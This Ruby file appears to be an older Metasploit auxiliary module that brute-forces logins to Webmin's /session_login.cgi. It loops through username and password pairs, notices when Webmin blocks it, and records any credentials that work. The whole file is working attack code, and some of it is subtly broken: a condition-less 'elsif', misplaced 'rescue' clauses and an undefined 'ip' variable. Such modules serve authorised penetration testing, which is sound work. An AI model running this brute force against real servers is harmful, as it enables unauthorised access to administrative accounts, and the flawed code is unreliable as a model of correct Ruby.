##
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::AuthBrute
  include Msf::Auxiliary::Report
  include Msf::Auxiliary::Scanner

  def initialize
    super(
      'Name'        => 'Webmin Login Brute Force Utility',
      'Version'     => '$Revision:$',
      'Description' => %q{
        This module sends login requests to /session_login.cgi on webmin. Default behavior appears
        to allow 5 attempts before a 300 second block. The module should report when the app blocks you.
        You will want to unset the PASSWORD variable or else it will try a blank password.
      },
      'References'  =>
      [
        [ 'URL', 'http://carnal0wnage.attackresearch.com' ]
      ],
      'Author'      => [ 'CG' ],
      'License'     => MSF_LICENSE
      )
      register_options([
        Opt::RPORT(10000),
        OptString.new('URI', [ false,  "The path to test", '/session_login.cgi']),
        OptString.new('CONTENTTYPE', [ false,  "The HTTP Content-Type Header", 'application/x-www-form-urlencoded']),
        OptString.new('UserAgent', [ false, "The HTTP User-Agent sent in the request", 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)' ])
      ], self.class)
  end

  def target_url
    "http://#{vhost}:#{rport}#{datastore['URI']}"
  end

  def run_host(ip)
    begin
      print_status("Verifying login exists at #{target_url}")
      res = send_request_cgi({
        'uri'     => datastore['URI'],
        'method'  => 'GET'
      }, 30)
      rescue
  print_error("The webmin interface doesnt seem to be at #{target_url}")
      return
    end
  print_status "#{target_url} - Webmin - Attempting authentication"

    each_user_pass { |user, pass|
      do_login(user, pass)
      }
  end

  def do_login(user=nil,pass=nil)
    post_data = "page='/'&user=#{Rex::Text.uri_encode(user.to_s)}&pass=#{Rex::Text.uri_encode(pass.to_s)}"
    vprint_status("#{target_url} - Webmin - Trying username:'#{user}' with password:'#{pass}'")

    begin
      res = send_request_cgi({
        'method' => 'POST',
        'uri' => datastore['URI'],
        'data' => post_data,
        'cookie' => 'testing=1'
        }, 20)
      if (res.nil?)
        print_error("no response for #{ip}:#{rport} datastore['PATH']")
      elsif ( res and res.code >= 200 and res.body.to_s.match(/failed/))
        vprint_error("#{target_url} - Webmin - LOGIN FAILED username:'#{user}' with password:'#{pass}'")
      elsif ( res and res.code >= 403)
        vprint_error("#{target_url} #{res.code} - Webmin - We got blocked")
      elsif ( res and res.code >= 302)
        print_good("#{target_url} - Webmin - Login Successful #{res.code} with '#{user}':'#{pass}' Redirect to->#{res.headers['Location']}")
        report_auth_info(
          :host => rhost,
          :port => rport,
          :sname => (ssl ? 'https' : 'http'),
          :user => user,
          :pass => pass,
          :proof => "WEBAPP=\"Webmin\", VHOST=#{vhost}",
          :source_type => "user_supplied",
          :duplicate_ok => true,
          :active => true
  )
      elsif
        print_status("Did you set the username?? \n #{res.code}")
      end
    end
    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
    rescue Timeout::Error, Errno::EINVAL, Errno::ECONNRESET, EOFError, Errno::ECONNABORTED, Errno::ECONNREFUSED, Errno::EHOSTUNREACH, ::Errno::EPIPE =>e
    end
  end
